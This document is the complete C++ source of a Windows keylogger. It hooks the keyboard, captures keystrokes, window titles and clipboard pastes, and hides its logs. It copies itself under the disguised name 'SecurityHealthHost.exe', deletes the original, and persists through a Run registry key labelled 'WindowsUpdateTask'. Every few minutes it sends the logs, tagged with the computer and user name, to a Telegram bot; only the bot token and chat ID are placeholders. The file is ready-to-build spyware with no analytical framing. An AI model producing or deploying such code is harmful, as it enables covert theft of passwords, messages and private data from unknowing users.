#include <windows.h>
#include <fstream>
#include <string>
#include <wininet.h>
#include <thread>
#include <chrono>
#include <time.h>
#include <vector>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(linker, "/SUBSYSTEM:windows /ENTRY:WinMainCRTStartup")

HHOOK hook;
std::string path_keylog;
std::string path_rawlog;

std::string GetCurrentDirectoryFile(std::string fileName)
{
	char buffer[MAX_PATH];
	GetModuleFileNameA(NULL, buffer, MAX_PATH);
	std::string pos(buffer);
	return pos.substr(0, pos.find_last_of("\\/")) + "\\" + fileName;
}



void WriteLog(std::string filePath, const std::wstring& text)
{
	if (text.empty()) return;
	SetFileAttributesA(filePath.c_str(), FILE_ATTRIBUTE_NORMAL);
	std::ofstream os(filePath, std::ios::app | std::ios::binary);
	if (os.is_open())
	{
		int size = WideCharToMultiByte(CP_UTF8, 0, text.c_str(), (int)text.length(), NULL, 0, NULL, NULL);
		std::string str(size, 0);
		WideCharToMultiByte(CP_UTF8, 0, text.c_str(), (int)text.length(), &str[0], size, NULL, NULL);
		os << str;
		os.close();
	}
	SetFileAttributesA(filePath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

}



std::wstring GetClipboardText()
{

	if (!OpenClipboard(nullptr)) return L"";

	HANDLE hData = GetClipboardData(CF_UNICODETEXT);

	if (hData == nullptr) { CloseClipboard(); return L""; }

	wchar_t* pszText = (wchar_t*)GlobalLock(hData);
	std::wstring text(pszText ? pszText : L"");

	GlobalUnlock(hData);
	CloseClipboard();

	return text;
}



void ProcessKey(int key, int scanCode, bool isKeyUp)
{

	static std::wstring prevProg = L"";
	static std::wstring textBuffer = L"";
	static bool shiftPressed = false, ctrlPressed = false, altPressed = false;
	static time_t lastFlushTime = time(NULL);
	static int bsCount = 0, shiftCount = 0, tabCount = 0, altCount = 0;

	time_t currentTime = time(NULL);


	if (!textBuffer.empty() && (currentTime - lastFlushTime) > 10)
	{
		WriteLog(path_keylog, textBuffer);
		textBuffer.clear();
		lastFlushTime = currentTime;
	}

	if (isKeyUp) 
	{
		if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) shiftPressed = false;
		if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) ctrlPressed = false;
		if (key == VK_MENU || key == VK_LMENU || key == VK_RMENU) altPressed = false;

		return;

	}



	auto flushIf = [&](int& count, const std::wstring& tag, int currentKey, int targetKey) 
	{
		if (count > 0 && currentKey != targetKey) 
		{
			WriteLog(path_rawlog, count == 1 ? L"[" + tag + L"]" : L"[" + tag + L" x" + std::to_wstring(count) + L"]");
			count = 0;
		}
	};



	flushIf(bsCount, L"BS", key, VK_BACK);

	if (!(key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT)) flushIf(shiftCount, L"SHIFT", key, -1);

	flushIf(tabCount, L"TAB", key, VK_TAB);

	if (!(key == VK_MENU || key == VK_LMENU || key == VK_RMENU)) flushIf(altCount, L"ALT", key, -1);
	if (key == VK_SHIFT || key == VK_LSHIFT || key == VK_RSHIFT) { shiftPressed = true; shiftCount++; return; }
	if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL) { ctrlPressed = true; return; }
	if (key == VK_MENU || key == VK_LMENU || key == VK_RMENU) { altPressed = true; altCount++; return; }

	HWND foreground = GetForegroundWindow();

	if (foreground) 
	{

		wchar_t wTitle[256];
		if (GetWindowTextW(foreground, wTitle, 256) > 0) 
		{

			if (prevProg != wTitle) 
			{

				WriteLog(path_keylog, textBuffer);

				textBuffer.clear();
				prevProg = wTitle;

				struct tm tm; localtime_s(&tm, &currentTime);
				wchar_t timeBuf[64]; wcsftime(timeBuf, 64, L"%d.%m.%Y %H:%M:%S", &tm);

				std::wstring header = L"\n\n[Window: " + prevProg + L" | Time: " + timeBuf + L"]\n";

				WriteLog(path_rawlog, header);
				WriteLog(path_keylog, header);

			}

		}

	}



	if (ctrlPressed && key == 'V')
	{
		std::wstring clip = GetClipboardText();

		if (!clip.empty()) {textBuffer += L"\n[CLIPBOARD START]\n" + clip + L"\n[CLIPBOARD END]\n";}

		return;

	}



	if (key == VK_BACK) { bsCount++; if (!textBuffer.empty()) textBuffer.pop_back(); return; }
	if (key == VK_TAB) { tabCount++; textBuffer += L"\t"; return; }



	if (key == VK_RETURN) 
	{
		WriteLog(path_rawlog, L"\n");
		textBuffer += L"\n";
		WriteLog(path_keylog, textBuffer);
		textBuffer.clear();
	}
	else if (key == VK_SPACE) 
	{
		WriteLog(path_rawlog, L" ");
		textBuffer += L" ";
	}
	else
	{

		BYTE kState[256];
		GetKeyboardState(kState);

		kState[VK_SHIFT] = (BYTE)GetKeyState(VK_SHIFT);
		kState[VK_CAPITAL] = (BYTE)GetKeyState(VK_CAPITAL);

		HKL layout = GetKeyboardLayout(GetWindowThreadProcessId(foreground, NULL));

		wchar_t buf[5] = { 0 };
		int res = ToUnicodeEx(key, scanCode, kState, buf, 4, 0, layout);

		if (res > 0) 
		{
			std::wstring charStr(buf, res);
			WriteLog(path_rawlog, charStr);
			if (buf[0] >= 32) textBuffer += charStr;

		}
	}
}



void SendFileToTelegram(std::string filePath, std::string logType) 
{

	std::string token = "YOUR_BOT_TOKEN_(TELEGRAM)";
	std::string chatId = "YOUR_CHAT_ID_(TELEGRAM)";
	std::string tempPath = filePath + ".tmp";

	if (std::rename(filePath.c_str(), tempPath.c_str()) != 0) { return; }



	std::ifstream fileStream(tempPath, std::ios::binary | std::ios::ate);
	if (!fileStream.is_open()) return;

	std::streamsize size = fileStream.tellg();

	if (size <= 3) 
	{
		fileStream.close();
		std::remove(tempPath.c_str());
		return;
	}


	fileStream.seekg(0, std::ios::beg);
	std::string content((std::istreambuf_iterator<char>(fileStream)), std::istreambuf_iterator<char>());
	fileStream.close();


	char compName[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD compSize = sizeof(compName);

	GetComputerNameA(compName, &compSize);

	char userName[256];

	DWORD userSize = sizeof(userName);
	GetUserNameA(userName, &userSize);
	std::string identity = std::string(compName) + "_" + std::string(userName);


	time_t now = time(0);

	struct tm tstruct; localtime_s(&tstruct, &now);
	char timeStr[80]; strftime(timeStr, sizeof(timeStr), "%Y-%m-%d_%H-%M-%S", &tstruct);
	std::string fileName = identity + "_" + logType + "_" + std::string(timeStr) + ".txt";

	bool isSent = false;
	HINTERNET hSession = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (hSession) 
	{
		HINTERNET hConnect = InternetConnectA(hSession, "api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);

		if (hConnect) 
		{

			std::string path = "/bot" + token + "/sendDocument";
			HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL, NULL, NULL, INTERNET_FLAG_SECURE, 0);

			if (hRequest) 
			{

				std::string boundary = "---7d82751e2e00d6";
				std::string body = "--" + boundary + "\r\n";
				body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n" + chatId + "\r\n";
				body += "--" + boundary + "\r\n";
				body += "Content-Disposition: form-data; name=\"document\"; filename=\"" + fileName + "\"\r\n";
				body += "Content-Type: text/plain\r\n\r\n" + content + "\r\n";
				body += "--" + boundary + "--\r\n";
				std::string headers = "Content-Type: multipart/form-data; boundary=" + boundary;

				if (HttpSendRequestA(hRequest, headers.c_str(), (DWORD)headers.length(), (LPVOID)body.c_str(), (DWORD)body.length())) 
				{
					isSent = true;
				}
				InternetCloseHandle(hRequest);
			}
			InternetCloseHandle(hConnect);
		}
		InternetCloseHandle(hSession);
	}

	if (isSent) 
	{
		std::remove(tempPath.c_str());
	}
	else 
	{
		std::ofstream out(filePath, std::ios::app | std::ios::binary);

		if (out.is_open()) 
		{
			out << "\n[NETWORK ERROR - DATA RECOVERED]\n";
			out << content;
			out.close();

		}
		std::remove(tempPath.c_str());
	}
}



void TimerThread() 
{
	std::this_thread::sleep_for(std::chrono::seconds(90));

	while (true) 
	{

		SendFileToTelegram(path_keylog, "KeyLog");
		SendFileToTelegram(path_rawlog, "RawLog");

		std::this_thread::sleep_for(std::chrono::seconds(300));
	}
}



LRESULT _stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam) 
{
	if (nCode >= 0) 
	{
		KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
		bool isKeyUp = (wParam == WM_KEYUP || wParam == WM_SYSKEYUP);
		ProcessKey(kb->vkCode, kb->scanCode, isKeyUp);

	}
	return CallNextHookEx(hook, nCode, wParam, lParam);
}





std::string MoveToSafePlace() 
{
	char currentPath[MAX_PATH];

	GetModuleFileNameA(NULL, currentPath, MAX_PATH);
	char appData[MAX_PATH];
	ExpandEnvironmentStringsA("%APPDATA%\\Microsoft\\Libs", appData, MAX_PATH);

	CreateDirectoryA(appData, NULL);
	SetFileAttributesA(appData, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);


	std::string targetPath = std::string(appData) + "\\SecurityHealthHost.exe";



	if (std::string(currentPath) != targetPath) {

		if (CopyFileA(currentPath, targetPath.c_str(), FALSE)) {

			SetFileAttributesA(targetPath.c_str(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);

			STARTUPINFOA si = { sizeof(si) };
			PROCESS_INFORMATION pi;

			if (CreateProcessA(targetPath.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {

				CloseHandle(pi.hProcess);
				CloseHandle(pi.hThread);

				std::string cmd = "cmd.exe /C choice /C Y /N /D Y /T 3 & del /F /Q \"" + std::string(currentPath) + "\"";

				WinExec(cmd.c_str(), SW_HIDE);

				exit(0);

			}

		}

	}

	return targetPath;

}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) 
{

	HANDLE hMutex = CreateMutexA(NULL, TRUE, "Global\\MyUniqueKeyloggerID");

	if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;

	FreeConsole();

	std::string hiddenExePath = MoveToSafePlace();
	size_t lastSlash = hiddenExePath.find_last_of("\\/");
	std::string folder = hiddenExePath.substr(0, lastSlash + 1);
	path_keylog = folder + "keylog.txt";
	path_rawlog = folder + "raw_log.txt";



	HKEY hKey;

	if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) 
	{
		RegSetValueExA(hKey, "WindowsUpdateTask", 0, REG_SZ, (const BYTE*)hiddenExePath.c_str(), (DWORD)hiddenExePath.length() + 1);
		RegCloseKey(hKey);
	}

	std::thread(TimerThread).detach();

	hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);

	MSG msg;

	while (GetMessage(&msg, NULL, 0, 0)) 
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return 0;
}